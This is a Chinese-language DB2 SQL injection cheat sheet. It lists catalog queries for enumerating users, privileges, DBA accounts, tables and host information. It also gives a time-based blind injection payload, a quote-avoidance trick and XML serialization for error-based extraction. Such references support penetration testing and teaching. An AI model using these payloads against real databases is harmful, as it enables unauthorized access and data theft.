# DB2 注入

> 

## 摘要

* [DB2 备忘单](#db2-cheatsheet)
* [参考资料](#references) 

## DB2 备忘单

### 版本

```sql
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+)
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info
```

### 评论	

```sql
select blah from foo -- 像这样添加注释（双破折号）
```

### 当前用户

```sql
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1
```

### 列出用户

DB2 使用操作系统账户

```sql
select distinct(authid) from sysibmadm.privileges -- 需要权限
select grantee from syscat.dbauth -- 结果不完整
select distinct(definer) from syscat.schemata -- 更准确
select distinct(grantee) from sysibm.systabauth -- 与前一个相同
```

### 列出权限

```sql
select * from syscat.tabauth -- 显示表的权限
select * from syscat.tabauth where grantee = current user -- 显示当前用户的权限
select * from syscat.dbauth where grantee = current user;;
select * from SYSIBM.SYSUSERAUTH — 列出 db2 系统权限
```

### 列出 DBA 账户	

```sql
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
```

### 当前数据库	

```sql
select current server from sysibm.sysdummy1
```

### 列出数据库

```sql
select distinct(table_catalog) from sysibm.tables
SELECT schemaname FROM syscat.schemata;
```

### 列出列

```sql
select name, tbname, coltype from sysibm.syscolumns -- 也适用于 syscat 和 sysstat
```

### 列出表

```sql
select table_name from sysibm.tables
select name from sysibm.systables
```

### 根据列名查找表	

```sql
select tbname from sysibm.syscolumns where name='username'
```

### 选择第 N 行

```sql
select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
```

### 选择第 N 个字符	

```sql
select substr('abc',2,1) FROM sysibm.sysdummy1 -- 返回 b
```

### 位运算 AND/OR/NOT/XOR

```sql
select bitand(1,0) from sysibm.sysdummy1 -- 返回 0。还有 bitandnot, bitor, bitxor, bitnot 可用
```

### ASCII 值

```sql
字符	select chr(65) from sysibm.sysdummy1 -- 返回 'A'
```

### 字符 -> ASCII 值	

```sql
select ascii('A') from sysibm.sysdummy1 -- 返回 65
```

### 类型转换

```sql
select cast('123' as integer) from sysibm.sysdummy1
select cast(1 as char) from sysibm.sysdummy1
```

### 字符串连接

```sql
select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- 返回 'abc'
select 'a' || 'b' from sysibm.sysdummy1 -- 返回 'ab'
```

### IF 语句

似乎只在存储过程中允许使用。改用案例逻辑。

### 案例语句

```sql
select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1
```

### 避免使用引号

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- 返回 “ADRI”。不使用 select 也可以工作
```

### 时间延迟

例如：如果用户以 ascii 68 ('D') 开头，将执行重查询，延迟响应。
但是，如果用户不是以 ascii 68 开头，重查询将不会执行，因此响应会更快。

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

### 序列化为 XML（用于基于错误的攻击）

```sql
select xmlagg(xmlrow(table_schema)) from sysibm.tables -- 将所有内容以一个 xml 格式的字符串返回
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- 同样，但没有重复元素
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- 将所有内容以一个 xml 格式的字符串返回（v8）。可能需要 CAST(xml2clob(… AS varchar(500)) 来显示结果。
```

### 命令执行和本地文件访问

似乎只能从过程或 UDFs 进行。

### 主机名/IP 和操作系统信息

```sql
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- 需要权限
```

### 数据库文件位置

```sql
select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- 需要权限
```

### 系统配置

```sql
select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- 需要权限。检索存储在内存中的所有数据库分区的数据库配置中的自动维护设置。
select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- 需要权限。检索存储在磁盘上的所有数据库分区的数据库配置参数值。
```

### 默认系统数据库

* SYSIBM
* SYSCAT
* SYSSTAT
* SYSPUBLIC
* SYSIBMADM
* SYSTOOLs


## 参考资料

* [DB2 SQL 注入备忘单 - Adrián - 20/05/2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
* [DB2 SQL 注入备忘单 - pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)